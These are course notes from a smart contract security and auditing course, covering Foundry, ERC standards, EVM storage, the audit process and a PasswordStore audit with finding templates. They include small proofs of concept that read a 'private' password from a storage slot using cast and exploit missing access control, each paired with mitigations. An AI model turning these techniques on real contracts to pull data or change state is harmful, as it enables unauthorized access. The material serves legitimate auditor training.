# [Smart Contract Security and Auditing](https://github.com/Cyfrin/security-and-auditing-full-course-s23) 

---

## Table of Contents

<details>

<summary> Lesson 1: Review </summary>

1. [Tooling Prerquisites](#table-of-contents)
2. [Solidity & Smart Contract Prerequisites](#solidity--smart-contract-prerequisites)
3. [Fuzzing and Invariants](#fuzzing-and-invariants)
4. [Install Libraries](#install-libraries)
4. [What is an ERC20](#what-is-an-erc20)
5. [What is an ERC721](#what-is-an-erc721)
6. [Storage](#storage)
7. [Fallback and Receive](#fallback-and-receive)
8. [Abi encode](#abi-encode)
9. [Encoding Functions](#encoding-functions)
10. [Upgradeable Contracts](#upgradeable-contracts)
11. [Selfdestruct](#selfdestruct)
12. [Fork Tests](#fork-tests)

</details>

<details>

<summary> Lesson 2: What is a Smart Contract Audit </summary>

1. [What is a smart contract audit?](#what-is-a-smart-contract-audit)
2. [The audit process](#the-audit-process)
3. [Rekt test](#rekt-test)
4. [Security Tools](#security-tools)
5. [What if a protocol I audit gets hacked?](#what-if-a-protocol-i-audit-gets-hacked)
6. [Top Web3 Attacks](#top-web3-attacks)

</details>

<details>

<summary> Lesson 3: PasswordStore Audit </summary>

1. [Your First Security Review](#your-first-security-review)
2. [Scoping: Etherscan](#scoping-etherscan)
3. [Scoping: Audit Details](#scoping-audit-details)
4. [Scoping: cloc](#scoping-cloc)
5. [The Tincho](#the-tincho)
6. [Recon: Context](#recon-context)
7. [Recon: Understanding the code](#recon-understanding-the-code)
8. [Exploit: Access Control](#exploit-access-control)
9. [Exploit: Public Data](#exploit-public-data)
10. [Protocol Tests](#protocol-tests)
11. [Writing an amazing finding: Overview](#writing-an-amazing-finding-overview)
12. [Writing an amazing finding: Title](#writing-an-amazing-finding-title)
13. [Writing an amazing finding: Description](#writing-an-amazing-finding-description)
14. [Writing an amazing finding: Proof of code](#writing-an-amazing-finding-proof-of-code)
15. [Writing an amazing finding: Recommended Mitigation](#writing-an-amazing-finding-recommended-mitigation)
16. [Finding Writeup](#finding-writeup)
17. [Access Control Write up](#access-control-write-up)
18. [Missing Access Controls Proof of Code](#missing-access-controls-proof-of-code)
19. [Finding Writeup Docs](#finding-writeup)
20. [Severity Rating Introduction](#severity-rating-introduction)
21. [Assessing Highs](#assessing-highs)
22. [Severity Rating Informational](#severity-rating-informational)
23. [Timeboxing](#timeboxing)
24. [Making a pdf](#making-a-pdf)

</details>

<details>

<summary> Lesson 4: PuppyRaffle Audit </summary>

1. [Introduction](#introduction)
2. [Phase 1: Scoping](#phase-1-scoping)
3. [Tooling: Slither](#tooling-slither)
4. [Tooling: Aderyn](#tooling-aderyn)
5. [Tooling: Solidity Visual Developer](#tooling-solidity-visual-developer)
6. [Recon: Reading the docs](#recon-reading-the-docs)
7. [Recon: Reading the code](#recon-reading-the-docs)
8. [sc-exploits minimized](#sc-exploits-minimized)
9. [Exploit: Denial of service](#exploit-denial-of-service)
10. [Case Study: DoS](#case-study-dos)
11. [DoS PoC](#dos-poc)
12. [DoS: Reporting](#dos-reporting)
13. [Exploit: Business logic edge case](#exploit-business-logic-edge-case)
14. [Recon: Refund](#recon-refund)
15. [Exploit: Reentrancy](#exploit-reentrancy)
16. [Reentrancy: Mitigation](#reentrancy-mitigation)
17. [Menace to Society](#menace-to-society)
18. [Reentrancy PoC](#reentrancy-poc)
19. [Recon Continued](#recon-continued)
20. [Exploit: Weak Randomness](#exploit-weak-randomness)
21. [Weak Randomness: Multiple issues](#weak-randomness-multiple-issues)
22. [Case Study: Weak Randomness](#case-study-weak-randomness)
23. [Weak Randomness: Mitigation](#weak-randomness-mitigation)
24. [Exploit: Integer Overflow](#exploit-integer-overflow)
25. [Integer Overflow Mitigation](#integer-overflow-mitigation)
26. [Exploit: Unsafe casting](#exploit-unsafe-casting)
27. [Recon II](#recon-ii)
28. [Exploit: Mishandling of Eth](#exploit-mishandling-of-eth)
29. [Recon III](#recon-iii)
30. [Info and gas findings](#info-and-gas-findings)
31. [Slither walkthrough](#slither-walkthrough)
32. [Aderyn Walkthrough](#aderyn-walkthrough)
33. [Test Coverage](#test-coverage)
34. [Phase 4: Reporting primer](#phase-4-reporting-primer)
35. [What is a competitive audit?](#what-is-a-competitive-audit)
36. [Submitting a competitive audit finding](#submitting-a-competitive-audit-finding)
37. [Reporting templates](#reporting-templates)
38. [Issues to keep in mind](#issues-to-keep-in-mind)

</details>

<details>

<summary> Lesson 5: TSwap </summary>

1. [Introduction](#introduction-1)
2. [Phase 1 Scoping](#phase-1-scoping)
3. [### Phase 2: Recon](#phase-2-recon)

</details>

## [Review](https://youtu.be/pUWmJ86X_do?t=1361)
### Tooling Prerequisites
[Foundry](https://book.getfoundry.sh/)
    - chisel
    - cast
    - forge
- [Windows Users: WSL](https://learn.microsoft.com/en-us/windows/wsl/install)
- AI Helpers
    - ChatGPT
    - Phind
- Forums & Resources
    - Ethereum Stack Exchange
    - Peeranha
    - Github Discussions

### Solidity & Smart Contract Prerequisites
- Should be familiar with [Remix](https://remix.ethereum.org/)
	- Compile
	- Deploy locally and deploy to test net using inject provider

**Foundry**
- Use foundry to create a project
	- make a directory: `mkdir directory-name`
    - `forge init --no-git` (use `--no-git` to avoid issues when creating a project already within a repository... not needed if creating a fresh project)
- Should be able to understand the following smart contract:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Counter {
    uint256 public number;

    function setNumber(uint256 newNumber) public {
        number = newNumber;
    }

    function increment() public {
        number++;
    }
}
```

- Use `forge build` to compile

**Testing**
- We have our tests in the `test` folder
	- run tests with `forge test`

```solidity
function test_Increment() public {
	counter.increment();
	assertEq(counter.number(), 1);
}
```
- This is a regular test where we expect a certain value

```solidity
function testFuzz_SetNumber(uint256 x) public {
	counter.setNumber(x);
	assertEq(counter.number(), x);
}
```
- This is a fuzz test that will use a certain number random numbers based on how many runs we set

- `foundry.toml` has a link for more info: https://github.com/foundry-rs/foundry/blob/master/crates/config/README.md#all-options
```
[fuzz]
runs = 256
max_test_rejects = 65536
seed = '0x3e8'
dictionary_weight = 40
include_storage = true
include_push_bytes = true
```
- This is how we can change the number of fuzz runs, by adding it to `foundry.toml`
- run a single test: `forge test --mt testName`

### Fuzzing and Invariants
- [Video](https://www.youtube.com/watch?v=juyY-CTolac)

**Fuzz testing**
- Fuzz testing: supply random data to your system to break it
- Invariant:  Property of our system that should always hold
- In a normal unit test, we would pass a single variable and test the function
- Steps we need to follow
	1. Understand the Invariants
	2. Write a fuzz test for invariant

**Stateless Fuzz test**
- The state of the previous run is discarded for every new run

**Stateful Fuzzing**
- The final state of the previous run is the starting state of your next run
- To write a stateful fuzz test in foundry, we use the [`invariant`](https://book.getfoundry.sh/forge/invariant-testing) keyword
- Stateful fuzzing should call the functions in our contract in a random order with random data
```solidity
import {StdInvariant} from "forge-std/StdInvariant.sol";

contract MyContractTest is StdInvariant, Test {
	...
	function invariant_testAlwaysReturnsZero() public {
		assertEq(exampleContract.shouldAlwaysBeZero() == 0);
	}
}
```

**Foundry Specific**
- In foundry, fuzz tests means giving random data to one function
- In foundry, invariant test means giving random data and random function calls to many functions
- Foundry fuzzing = stateless fuzzing
- Foundry invariant = stateful fuzzing

**Examples of Invariants**
- New tokens minted < inflation rate
- Only possible to have 1 winner in a lottery
- Only withdraw what you deposit

### Install Libraries
- [OpenZeppelin Contracts](https://www.openzeppelin.com/contracts)
	- popular library for smart contracts

**Install OpenZeppelin Contracts**
- `forge install OpenZeppelin/openzeppelin-contracts --no-commit`

**Set remappings**
- `foundry.toml`:
```
remappings = ['@openzeppelin/contracts=lib/openzepplin-contracts/contracts']
```

**Import**
```solidity
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
```

**Set constructor**
```solidity
contract MyToken is ERC20 {
	constructor() ERC20("MyTokenName", "MTN"){}
}
```
- Gives us a minimal ERC20

### What is an ERC20
- ERC20s are tokens that are deployed on a chain using the [ERC20 token standard](https://ethereum.org/en/developers/docs/standards/tokens/erc-20/)
	- And ERC20 is a smart contract (it's also a token)

- Why make an ERC20?
	- Governance tokens
	- Secure an underlying network
	- Create a synthetic asset
	- Anything else

- How do we create an ERC20?
	- All we have to do is create a smart contract that follows the ERC20 standard

- An ERC20 should have these methods:
```solidity
function name() public view returns (string) 
function symbol() public view returns (string) 
function decimals() public view returns (uint8) 
function totalSupply() public view returns (uint256) 
function balanceOf(address _owner) public view returns (uint256 balance) 
function transfer(address _to, uint256 _value) public returns (bool success) 
function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) 
function approve(address _spender, uint256 _value) public returns (bool success) 
function allowance(address _owner, address _spender) public view returns (uint256 remaining)
```

- [ERC677](https://github.com/ethereum/EIPs/issues/677) improves on ERC20 but is still ERC20 compatible
	- Chainlink is an example

- [ERC777](https://docs.openzeppelin.com/contracts/3.x/erc777) is another improvement of the ERC20 that is still ERC20 compatible

### What is an ERC721
- [ERC721](https://eips.ethereum.org/EIPS/eip-721) is a token standard for non fungible tokens.
	- Each token from a class is unique from another
	- As opposed to an ERC20 token where all the tokens from a class are all the same
- Current use case for ERC721 is mainly art, but it has potential for more
- Currently, artists can use ERC721 tokens for better compensation for their work
- [ERC1155](https://ethereum.org/en/developers/docs/standards/tokens/erc-1155/) tokens represent "semi-fungible" assets

**Differences between ERC20 and ERC721**
- ERC20s have a mapping between an address and how much that address holds
```solidity
mapping (address => uint256) private _balances;
```

- ERC721s have unique token ids mapped to addresses of ownership
```solidity
mapping (uint256 => address) private _owners;
```

- A token [URI](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier) is a unique indicator of the unique attributes of an ERC721 token
```json
{
	"name": "Name",
	"description": "Description",
	"image":"URI",
	"attributes": []
}
```
- a typical token URI

### Storage
- Global variables are found in something called [storage](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html)
	- Storage is a giant array of all the variables that we create in a contract
- Variables are allocated to storage slots
	- Each slot is 32 bytes long and represents the bytes version of the object
	- Each storage slot increments starting from 0
- For dynamic values like mappings and dynamic arrays, the elements are stored using a hashing function
	- For arrays, a sequential storage spot is taken up for the length of the array
	- For mappings, a sequential storage spot is taken up, but left blank
- constant variables aren't stored in slot, they're stored in the contract bytecode
- Variables inside a function, only exist for the duration of the function
- `forge inspect ContractName storage`: prints the storage information of the contract

### Fallback and Receive
- By default, solidity smart contracts reject eth 
- A contract receiving ether must have either [fallback](https://solidity-by-example.org/fallback/) or [receive](https://solidity-by-example.org/sending-ether/)
	- receive is called if `msg.data` is empty
- When sending eth to a contract, the first check is whether or not `msg.data` is empty
	- If there is `msg.data`, it will go to the fall back function
	- if there is no `msg.data`, it will check if there is a `receive()` function
	- if there is no `receive()` function it will go to the `fallback()`
	- if there is no `fallback()` the contract can't receive eth

### Abi encode
- [Contract ABI Specification](https://docs.soliditylang.org/en/develop/abi-spec.html)
- [Abi encoding and decoding functions](https://docs.soliditylang.org/en/v0.8.11/units-and-global-variables.html#abi-encoding-and-decoding-functions)

- [Encoding.sol](https://github.com/Cyfrin/foundry-nft-f23/blob/main/src/sublesson/Encoding.sol)
```solidity
function combineStrings() public pure returns (string memory) {
	return string(abi.encodePacked("Hi Mom! ", "Miss you."));
}
```
- With this function, we're encoding the string into its bytes form
- In `solidity ^0.8.12`, we can use `string.concat(stringA,stringB)`

**EVM overview**
- The EVM (ethereum virtual machine) is a computation engine that handles smart contract deployments and execution
- When we compile our code, we get a `.abi` file and a `.bin` file
	- When we send our contract to the blockchain, we're sending the binary (`.bin`)

**Transactions - Fields**
- nonce: tx count for the account
- gas price: price per unit of gas (in wei)
- gas limit: max gas that this tx can use
- to: address that the tx is sent to
- value: amount of wei to send
- data: what to send to the to address
- v,r,s: components of tx signature

**Transactions - Contract creation**
- nonce: tx count for the account
- gas price: price per unit of gas (in wei)
- gas limit: max gas that this tx can use
- to: EMPTY
- value: amount of wei to send
- data: contract init code and contract bytecode
- v,r,s: components of tx signature

- [Opcodes](https://www.evm.codes/)
	- The EVM uses opcodes to execute transactions
	- Opcodes represent all the instructions a computer must be able to read in order for it to interact with Ethereum
	- Solidity compiles down to opcodes

- `abi.encode` abi-encodes the given argument
	- we can encode anything we want into binary format
	- so what we're doing is making whatever data we encode, machine readable
- `abi.encodepacked` is a non standard way to encode into binary, performing [packed](https://docs.soliditylang.org/en/v0.8.11/abi-spec.html#abi-packed-mode) encoding
- [difference between abi.encodePacked(string) and bytes(string)](https://forum.openzeppelin.com/t/difference-between-abi-encodepacked-string-and-bytes-string/11837)

- `abi.decode` ABI-decodes the given data while the types are given in parentheses as the second argument

- we can use `abi.encode` and combine something like two strings... then we could `abi.decode` and return both of those original strings
	- we can't do that with `abi.encodepacked`

### Encoding Functions
- We can populate the `data` value of transactions with information 
- In a function call, the `data` is what to send to the address
	- So, in a transaction call, we can send the data field ourselves
	- This allows us to make function calls without having to interact with the actual function/contract???

- call: how we call functions to change the state of a blockchain
- staticcall: how we access "view" or "pure" functions
	- [Staticcall](https://www.rareskills.io/post/solidity-staticcall)

```solidity
(bool success, ) = recentWinner.call{value: address(this).balance}("");
```
- In the curly braces, we pass specific fields of a transaction such as value
- In parentheses, we can pass data such as a call to a specific function

### Upgradeable Contracts
- [Proxy upgrade pattern](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies)
- [delegatecall](https://solidity-by-example.org/delegatecall/)

### Selfdestruct 
- [Selfdestruct](https://solidity-by-example.org/hacks/self-destruct/) will be removed in an upcoming hard fork
	- Contracts can be deleted from the blockchain by calling `selfdestruct`.
	- `selfdestruct` sends all remaining Ether stored in the contract to a designated address.
- If a contract doesn't have `receive` or `fallback`, it can't receive ETH. However, you could create another contract and `selfdestruct` sending ETH to a contract without `receive` or `fallback`

### Fork Tests
- `forge test --fork-url <URL>`
	- You would use something like your alchemy URL for something like main net
	- This would allow us to work with main net/ test net contracts locally
- [`vm.createSelectFork`](https://book.getfoundry.sh/cheatcodes/create-select-fork)
	- Creates _and_ selects a new fork from the given endpoint and returns the identifier of the fork. If a block number is passed as an argument, the fork will begin on that block, otherwise it will begin on the _latest_ block.
	- If a transaction hash is provided, it will roll the fork to the block the transaction was mined in and replays all previously executed transactions.
```solidity
uint256 forkId = vm.createSelectFork(MAINNET_RPC_URL);
```

## [What is a smart contract audit](https://youtu.be/pUWmJ86X_do?t=6748)
### What is a smart contract audit?
- A time boxed, security based code review 
	- It's not an audit that guarantees a codebase is bug free
	- It is a security focused review
- 3 phases of a security review
    - Initial Review
        - 0. Scoping
        - 1. Reconnaissance
        - 2. Vulnerability identification
        - 3. Reporting
    - Protocol fixes
        - 1. Fixes issues
        - 2. Retests and adds tests
    - Mitigation Review
        - 1. Reconnaissance
        - 2. Vulnerability identification
        - 3. Reporting

- An auditor's goal is to find as many vulnerabilities as possible and educate the protocol on security and coding best practices
	- Auditors use a combination of manual review and automated tools to find vulnerabilities

- Scope: the code that will be audited
- Lines of code: duration
	- 100: 2.5 days
	- 500: 1 week
	- 1000: 1-2 weeks
	- 2500: 2-3 weeks
	- 5000: 3-5 weeks
	- 5000+: 5+ weeks

- Findings are listed by severity
	- Highs
	- Mediums
	- Lows
	- Informational/ Non-critical
	- Gas Efficiencies
- High/medium/low represent the severity of impact and likelihood of each vulnerability
- Informational/Gas/Non-critical are findings to improve the efficiency of your code and code structure
	- best practice improvement suggestions are not vulnerabilities but ways to improve code

- To get the most out of an audit:
	1. Have clear documentation
	2. Robust test suite ideally including fuzz tests
	3. Code should be commented and readable
	4. Modern best practices followed
	5. Communication channel between auditors and developers
	6. Do an initial video walkthrough of code

- Security is a continuous process... and audit is not a silver bullet

- Competitive vs Private audit mindset
	- Competitive: Find as many high impact bugs as possible
	- Private: Find as many high impact bugs as possible, and do whatever you can to make the client safer

### The audit process
- High level overview
	1. Get context
	2. Tools and Manual Review
	3. Write Report

- Audit process in depth (3 phases)
    1. Initial Review
        a. Scoping
        b. Reconnaissance
        c. Vulnerability identification
	    d. Reporting
    2. Protocol fixes
        a. Fixes issues
        b. Retests and adds tests
	3. Mitigation Review
        a. Repeat (#1)

- The report is to do whatever it takes to make the protocol more secure (for a private audit)

- [Smart Contract Development Life Cycle](https://aws.amazon.com/what-is/sdlc/)
	- Plan & Design
	- Develop & Test
	- Smart Contract Audit & Post Deploy Planning
	    - [Is this just one step?](https://aws.amazon.com/what-is/sdlc/)
	- Deploy
	- Monitor & Maintain

- Doing a smart contract audit to check a box is the wrong mentatlity
	- Security is ongoing throughout the life of the protocol

### Rekt test
- [simple security toolkit](https://github.com/nascentxyz/simple-security-toolkit)
- [the rekt test](https://blog.trailofbits.com/2023/08/14/can-you-pass-the-rekt-test/)
	1. _Do you have all actors, roles, and privileges documented?_
	2. _Do you keep documentation of all the external services, contracts, and oracles you rely on?_
	3. _Do you have a written and tested incident response plan?_
	4. _Do you document the best ways to attack your system?_
	5. _Do you perform identity verification and background checks on all employees?_
	6. _Do you have a team member with security defined in their role?_
	7. _Do you require hardware security keys for production systems?_
	8. _Does your key management system require multiple humans and physical steps?_
	9. _Do you define key invariants for your system and test them on every commit?_
	10. _Do you use the best automated tools to discover security issues in your code?_
	11. _Do you undergo external audits and maintain a vulnerability disclosure or bug bounty program?_
	12. _Have you considered and mitigated avenues for abusing users of your system?_

### Security Tools
- Test suites
	- Foundry
	- Hardhat
	- Brownie
- Static analysis: Automatically checking code for issues without executing anything (the debugging is static)
	- Slither
	- Aderyn
	- Mythril
- Fuzz Testing: Also known as fuzzing, involves providing random data inputs during testing
- Stateful Fuzz testing: Fuzz testing, but the system remembers the state of the last fuzz test and continues with the new fuzz test
- Differential Tests (not covered)
- Formal Verification
	- A generic term for applying formal methods to verify the correctness of hardware
	- Applying FM means anything based on mathematical proofs, in software often used as a proof of correctness or proof of bug
- Symbolic Execution: A form of FV where you convert software to a mathematical expression
	- MAT
	- Manticore
	- Certora
	- Z3
- [Web3 Bugs](https://github.com/ZhangZhuoSJTU/Web3Bugs)
	- Currently, ~80% of bugs are not machine auditable 

### What if a protocol I audit gets hacked?
- An audit should be valuable on its own merit beyond finding critical issues
	- Provide some value other than finding issues
	- The less critical issues you miss, the better
	- But auditors won't find all the issues
- Just because an auditor missed something, doesn't mean the protocol can use that as a scapegoat
	- So it is a good idea to have a private audit, run it through contests, and have a bug bounty program
	- The more audits done, the better off the protocol will be
- As an auditor, when a hack does happen, you can help contain the vulnerability or mitigate the attack
	- Your responsibility is limited to the agreement you signed with the client, but you should provide support for the clients that hired you when a hack occurs

### Top Web3 Attacks
- Defi attack vectors (2023) - Top 10 by risk
	- price oracle manipulation - $146,000,000 - 52
	- reward manipulation - $200,000,000 - 27
	- stolen private keys - $243,000,000 - 16
	- insufficient function access control - $17,000,000 - 25
	- logic error - $17,000,000 - 9
	- function parameter validation - $15,000,000 - 9
	- read only reentrancy - $13,000,000 - 7
	- reentrancy - $7,500,000 - 10
	- governance - $7,000,000 - 8
	- misconfiguration - $17,600,000 - 3


## [PasswordStore Audit](https://youtu.be/pUWmJ86X_do?t=8571)
### Your First Security Review
Remember the phases:
- Initial Review
    - 0. Scoping
    - 1. Reconnaissance
    - 2. Vulnerability identification
    - 3. Reporting
For this demo, we are ignoring the last 2 phases:
- Protocol fixes
    - 1. Fixes issues
    - 2. Retests and adds tests
- Mitigation Review
    - 1. Reconnaissance
    - 2. Vulnerability identification
    - 3. Reporting

### Scoping: Etherscan
The first step is the "scoping phase" where we get the contract and understand the scope of what we'll be reviewing
- Security review code v1: https://sepolia.etherscan.io/address/0x2ecf6ad327776bf966893c96efb24c9747f6694b
- Part of the job of a security researcher is to educate protocols. 
	- So just just getting an etherscan link and nothing else is an opportunity for education
	- Protocols should have test suites and deployment suites which help to assess code maturity

If you were just given an etherscan link, where would you start auditing?
- Check the contracts deployed along with this one and check the transactions? (my answer)
- Actual answer: Rekt test
	1. _Do you have all actors, roles, and privileges documented?_
	2. _Do you keep documentation of all the external services, contracts, and oracles you rely on?_
	3. _Do you have a written and tested incident response plan?_
	4. _Do you document the best ways to attack your system?_
	5. _Do you perform identity verification and background checks on all employees?_
	6. _Do you have a team member with security defined in their role?_
	7. _Do you require hardware security keys for production systems?_
	8. _Does your key management system require multiple humans and physical steps?_
	9. _Do you define key invariants for your system and test them on every commit?_
	10. _Do you use the best automated tools to discover security issues in your code?_
	11. _Do you undergo external audits and maintain a vulnerability disclosure or bug bounty program?_
	12. _Have you considered and mitigated avenues for abusing users of your system?_

If we're trying to do a proper audit, you can't pass a security review unless you can pass the Rekt test.

### Scoping: Audit Details
Security Review code v2: https://github.com/Cyfrin/3-passwordstore-audit
- This version is better than just getting an Etherscan link, but there are still problems
	- The documentation is just generic foundry documentation
	- There is no test folder
	- We're not sure what we're supposed to be auditing

[Minimal Smart Contract Secuirty Review Onboarding](https://github.com/Cyfrin/security-and-auditing-full-course-s23/blob/main/minimal-onboarding-questions.md): Questions to ask to get the minimum information before an audit
- About the project/Documentation
	- most bugs come from business logic, so we need to know exactly what the protocol is supposed to do
- Stats
	- How big is the protocol?
	- How many lines of code are there?
	- How complex is the code?
- Setup
	- We need to understand how to set up the project
- Security review scope
	- We need to nail down exactly what the protocol is deploying and how they're deploying it
	- What is the exact commit hash

Security review code v3: https://github.com/Cyfrin/3-passwordstore-audit/tree/onboarded
[Minimal filled](https://github.com/Cyfrin/3-passwordstore-audit/blob/onboarded/minimal-onboarding-filled.md)
- Roles give us insight into how the protocol works
- Known issues are important to have 

We clone the repo and move to our audit branch
- `git clone https://github.com/Cyfrin/3-passwordstore-audit`
- `cd 3-passwordstore-audit`
- `git checkout 7d55682ddc4301a7b13ae9413095feffd9924566`
- `git switch -c passwordstore-audit`


### Scoping: cloc
- We want to get the stats of the protocol
- [cloc](https://github.com/AlDanial/cloc): count lines of code
	- cloc counts blank lines, comment lines, and physical lines of source code in many programming languages.
```
npm install -g cloc              # https://www.npmjs.com/package/cloc
sudo apt install cloc            # Debian, Ubuntu
sudo yum install cloc            # Red Hat, Fedora
sudo dnf install cloc            # Fedora 22 or later
sudo pacman -S cloc              # Arch
sudo emerge -av dev-util/cloc    # Gentoo https://packages.gentoo.org/packages/dev-util/cloc
sudo apk add cloc                # Alpine Linux
doas pkg_add cloc                # OpenBSD
sudo pkg install cloc            # FreeBSD
sudo port install cloc           # macOS with MacPorts
brew install cloc                # macOS with Homebrew
winget install AlDanial.Cloc     # Windows with winget
choco install cloc               # Windows with Chocolatey
scoop install cloc               # Windows with Scoop
```
- to verify installation: `cloc --help`
- enter the file or path: ` cloc ./src`
- `nSLOC` = number of source lines of code

### The Tincho
- After scoping, we're ready to go into recon
- He doesn't have a "formal process", but there are general steps to take
**Audit Process**
1. download the code/ read the docs (at least the intro)
2. bring the tools you like best (if a project is using hardhat, use foundry if you want)
3. build small building blocks, by briefly analyzing the code
4. take notes, both in code and seperately
5. when you end up in rabbit holes filling in knowledge gaps, remember to stay focused on the audit
- [Tincho’s ENS Review](https://www.youtube.com/watch?app=desktop&v=A-T9F0anN1E)

### Recon: Context
- Start by reading the docs
- [Solidity Metrics](https://github.com/Consensys/solidity-metrics)
	- For windows, I have to `Ctrl+Shift+P` and choose `Solidity Metrics: report for all open work spaces`
	- after running, use the command pallet again to export report

### Recon: Understanding the code
- Looking for bugs is a direct result of understanding the codebase
- Run through the code line by line and take notes
- Notes
	- About the project, in my words
	- Attack vector ideas
- Well documented code makes things easier, but without it, an open line of communication with the devs is the only way to know intended effects

### Exploit: Access Control
- Make sure functions that are meant to be restricted have proper access control
	- One of the reasons documentation/nat spec is important is so 

### Exploit: Public Data
- All information on a blockchain is public
	- using the `private` keyword does not hide the variable

### Protocol Tests
- For a private traditional audit, your goal is to do whatever you can to make the protocol more secure
	- Look into improving the protocol's tests and engineering best practices
- Tests can give you a hint into what the protcol is and isn't testing

### Writing an amazing finding: Overview
- After the recon phase, we move to the reporting phase
- In a private audit, we need to convey information to the protocol to make it safer
- In a competitive audit, we need to also prove to judges why this issue must be fixed

**Finding Layout**
```
### [S-#] TITLE (Root Cause + Impact)

**Description:**

**Impact:**

**Proof of Concept:**

**Recommended Mitigation:**
```

**Our objective in reporting a finding**
1. Convince the protocol there is an issue
2. How bad the issue is
3. How to fix the issue

### Writing an amazing finding: Title
`### [S-#] TITLE (Root Cause + Impact)`
- S = severity, # = number
- The title should explain the root cause and the impact
```
Variables stored on chain are visible to anyone, no matter the solidity visibility keyword... the password is not kept private
```
OR
```
Storing the password on chain makes it visible to anyone and no longer private
```

### Writing an amazing finding: Description
- We want to be succinct with our information
- The description should elaborate on the title
```
All data stored on chain is visible to anyone, and can be read directly from the blockchain. The `PasswordStore::s_password` variable is intended to be a private variable and only accessed through the `PasswordStore::getPassword` function, which is intended to be only called by the owner of the contract.

We show one such method of reading any data off chain below.
```
- When we reference functions in markdown, we use backticks to make them standout and reference the file the function or variable is located in:
	- `PasswordStore::s_password`
	- `PasswordStore::getPassword`
- For the Impact, describe what happens to the protocol as an effect of the vulnerability
- Proof of concept (sometimes proof of code) is where we prove to the protocol that this is a real issue

### Writing an amazing finding: Proof of code
- Some POCs can be defined with the help of `anvil`... just run `anvil` in the command line
- Then we can deploy to the local anvil chain
```
deploy:
    @forge script script/DeployPasswordStore.s.sol:DeployPasswordStore $(NETWORK_ARGS)
```

- With `cast`, we can pick the storage slot we want to read from
```
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 1 --rpc-url http://127.0.0.1:8545

0x6d7950617373776f726400000000000000000000000000000000000000000014
```

- We can use `cast` to parse bytes data
```
cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014

my password
```

**Proof of Concept:**
1. Create a locally running chain using anvil
```bash
make anvil
```
2. Deploy the contract to the chain
```bash
make deploy
```
3. Run the storage tool
We use `1`because that's the storage slot of `s_password` in the contract
```
cast storage <ADDRESS_HERE> 1 --rpc-url http://127.0.0.1:8545
```
You'll get an output like this:
`0x6d7950617373776f726400000000000000000000000000000000000000000014`
You can then parse the hex to a string with:
```bash
cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014
```
And get an output off:
`myPassword`

### Writing an amazing finding: Recommended Mitigation
- In the example protocol we're looking at, the whole protocol is useless because storing passwords on chain doesn't make sense
	- Having a security mindset when creating a password can help mitigate problems like this
- However, our goal is to help the protocol
```
Due to this, the overall architecture of the contract should be rethought. One could encrypt the password off-chain, and store the encrypted password on-chain. This would require the user to remember another password off-chain to decrypt the password. However, you'd also want to remove the view funtion as you wouldn't want the user to accidentally send a transaction with the password that decrypts your password.
```

### Finding Writeup
```
### [S-#] Storing the password on chain makes it visible to anyone and no longer private

**Description:**
All data stored on chain is visible to anyone, and can be read directly from the blockchain. The `PasswordStore::s_password` variable is intended to be a private variable and only accessed through the `PasswordStore::getPassword` function, which is intended to be only called by the owner of the contract.

We show one such method of reading any data off chain below.

**Impact:**
Anyone can read the private password, severly breaking the functionality of the protocol.

**Proof of Concept:**
The test below shows how anyone can read the password directly from the blockchain.

1. Create a locally running chain using anvil
make anvil
2. Deploy the contract to the chain
make deploy
3. Run the storage tool
We use `1`because that's the storage slot of `s_password` in the contract
cast storage <ADDRESS_HERE> 1 --rpc-url http://127.0.0.1:8545
You'll get an output like this:
`0x6d7950617373776f726400000000000000000000000000000000000000000014`
You can then parse the hex to a string with:
cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014
And get an output off:
`myPassword`

**Recommended Mitigation:**
Due to this, the overall architecture of the contract should be rethought. One could encrypt the password off-chain, and store the encrypted password on-chain. This would require the user to remember another password off-chain to decrypt the password. However, you'd also want to remove the view funtion as you wouldn't want the user to accidentally send a transaction with the password that decrypts your password.
```

### Access Control Write up
```
### [S-#] `PasswordStore::setPassword` has no access controls, meaning a non owner could change the password

**Description:** The `PasswordStore::setPassword` function is set to be `external`, however, the natspec of the function and the overall purpose of the fucntion is that `This function allows only the owner to set a new password.`

`js
function setPassword(string memory newPassword) external {
@>	// @audit - There are no access controls
	s_password = newPassword;
	emit SetNetPassword();
}
`

**Impact:** Anyone can set/change the password of the contract, breaking the intended functionality.

**Proof of Concept:**

**Recommended Mitigation:**
```

### Missing Access Controls Proof of Code
- Remember that our goal is to prove to the protocol that this can happen.
- For this example, we can use the existing tests

Added the following the the `PasswordStor.t.sol` test file:

<details>

<summary>code</summary>

```js
function test_anyone_can_set_password(address randomAddress) public {
	vm.assume(randomAddress != owner);

	vm.prank(randomAddress);
	string memory expectedPassword = "myNewPassword";
	passwordStore.setPassword(expectedPassword);

	vm.prank(owner);
	string memory actualPasswrod = passwordStore.getPassword();

	assertEq(actualPasswrod,expectedPassword);
}
```

</details>

**Recommended Mitigation** Add an access control conditional to the `setPassword` function.
```js
if (msg.sender != s_owner) {
	revert PasswordStore__NotOwner();
}
```

### Finding Writeup Docs
- Gas and informational severities don't need as extensive write-ups as other severities
```
### [S-#] The `PasswordStore::getPassword` natspec indicates a parameter that doesn't exist, causing the natspec to be incorrect

**Description:**
`js
	/*
	 * @notice This allows only the owner to retrieve the password.
	 * @param newPassword The new password to set.
	 */
	
	function getPassword() external view returns (string memory) {
`
The `PasswordStore::getPassword` function signature is `getPassword()` while the natspec says it should be `getPassword(string)`.

**Impact:** The natspec is incorrect.

**Recommended Mitigation:** Remove the incorrect natspec line
`diff
- * @param newPassword The new password to set.
`
```
- For a finding like this, we don't need a proof of concept (at least for this specific finding)
- We can use the `diff` keyword in markdown to indicate lines to be added (+) or removed (-)

###  Severity Rating Introduction
- [Severity guide](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity)
	- High 
	- Medium
	- Low
	- Some like to add a "critical" rating
- We figure out severity by looking at the likelihood of the attack vs the impact
	- This can be subjective, but it is a path towards some standardization

**Impact**
- **High Impact**:
    - Funds are directly or nearly directly at risk.
    - There's a severe disruption of protocol functionality or availability.
